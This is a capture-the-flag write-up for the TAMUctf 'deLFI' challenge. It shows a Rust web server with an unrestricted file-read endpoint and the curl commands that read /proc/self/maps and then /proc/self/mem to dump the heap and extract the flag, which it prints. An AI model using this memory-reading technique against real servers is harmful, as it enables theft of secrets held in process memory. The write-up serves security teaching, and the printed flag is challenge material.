# deLFI

We found a strange webserver at http://delfi.tamuctf.com -- check it out for us?

## Solution

The website (delfi.tamuctf.com) is seemingly just a trivial LFI.  If we didn't have source we could use this to leak the binary with the provided path but....

```text
Ask the /oracle for a file, e.g., /oracle/home/delfi/bin/delfi?offset=0&size=-1.
```

Fortunately, source is provided so we don't have to reverse async rust thank god.  

```rust
use hyper::Body;
use serde_derive::*;
use std::cmp::min;
use std::convert::{Infallible, TryInto};
use std::fs::File;
use std::os::unix::fs::FileExt;
use std::path::PathBuf;
use tokio::process::Command;
use warp::filters::path::Tail;
use warp::hyper::StatusCode;
use warp::{http::Response, Filter, Reply};

#[derive(Deserialize, Serialize)]
struct FileOptions {
    offset: usize,
    size: isize,
}

#[tokio::main]
async fn main() {
    let flag = Command::new("get_flag").output().await.unwrap().stdout;

    let oracle = warp::path("oracle").and(
        warp::path::tail()
            .and(warp::query::<FileOptions>().map(Some).or_else(|_| async {
                Ok::<(Option<FileOptions>,), std::convert::Infallible>((None,))
            }))
            .map(|file: Tail, options: Option<FileOptions>| {
                let path = PathBuf::from(format!("/{}", file.as_str()));
                if path.exists() {
                    match File::open(path.clone()) {
                        Ok(f) => {
                            let (offset, size) = if let Some(options) = options {
                                (options.offset, options.size)
                            } else {
                                (0, -1)
                            };
                            println!(
                                "Reading {} with at offset {} with size {}",
                                path.display(),
                                offset,
                                size
                            );
                            let mut pos = offset;
                            // oops, chunked responses aren't a thing that exist!
                            // looks like we'll have to do it ourselves... again
                            Response::new(Body::wrap_stream(futures::stream::iter(
                                std::iter::from_fn(move || {
                                    let size = if size >= 0 {
                                        min(4096, size as usize - (pos - offset))
                                    } else {
                                        4096
                                    };
                                    if size == 0 {
                                        None
                                    } else {
                                        let mut buf = vec![0u8; size];
                                        match f.read_at(buf.as_mut(), pos.try_into().unwrap()) {
                                            Ok(s) => {
                                                if s == 0 {
                                                    None
                                                } else {
                                                    pos += s;
                                                    buf.truncate(s);
                                                    Some(buf)
                                                }
                                            }
                                            Err(e) => {
                                                eprintln!(
                                                    "Error while processing {}: {}",
                                                    path.display(),
                                                    e
                                                );
                                                None
                                            }
                                        }
                                    }
                                })
                                .map(Result::<_, Infallible>::Ok),
                            )))
                        }
                        Err(e) => {
                            eprintln!("Error while opening {}: {}", path.display(), e);
                            warp::reply::with_status(
                                warp::reply(),
                                StatusCode::INTERNAL_SERVER_ERROR,
                            )
                            .into_response()
                        }
                    }
                } else {
                    warp::reply::with_status(warp::reply(), StatusCode::NOT_FOUND).into_response()
                }
            }),
    );

    let default = warp::get().map(|| Response::builder()
        .header("Content-Type", "text/html;encoding=UTF-8")
        .body(format!(
            "Ask the <code>/oracle</code> for a file, e.g., <a href=\"/oracle{0}?offset=0&size=-1\"><code>/oracle{0}?offset=0&size=-1</code></a>.",
            std::env::current_exe().unwrap().display()
        ))
    );

    warp::serve(oracle.or(default))
        .run(([0, 0, 0, 0], 3030))
        .await;

    drop(flag);
}
```

Okay, a couple interesting things to note here and i'm just going to walk through my though process.  

1. Flag is loaded into memory from get_flag binary
2. im not gonna reverse it for the writeup because its gross and not really relevant but its a suid binary that reads /root/flag and writes it to stdout
3. Per the [rust docs](https://doc.rust-lang.org/std/process/struct.Output.html) std::process::Output.stdout is a Vec<u8> and thus on the heap.
4. wait a minute linux maps process memory to /proc/<pid>/mem (or /proc/self/mem for the executing process)
5. To use /proc/self/mem you need to make sure to only access mapped memory.  
```text
❯ curl -s "delfi.tamuctf.com/oracle/proc/self/maps" | strings | grep heap | cut -d' ' -f1
562888b53000-562888bb6000
```
Converting the base to decimal and then subtracting the end from the base to get the length (and converting to decimal) gets us 94732092256256, 405504.  If you'll remember from earlier, the LFI function takes offset and size functions which means we will be able to trivially slice just the heap.  

```text
❯ curl -s "delfi.tamuctf.com/oracle/proc/self/mem?offset=94732092256256&size=405504" | strings | grep -E "gigem{.*}"
gigem{d4ng3r0u5ly_3xfil7r47in6_l0c4l_fil3_includ35}
```
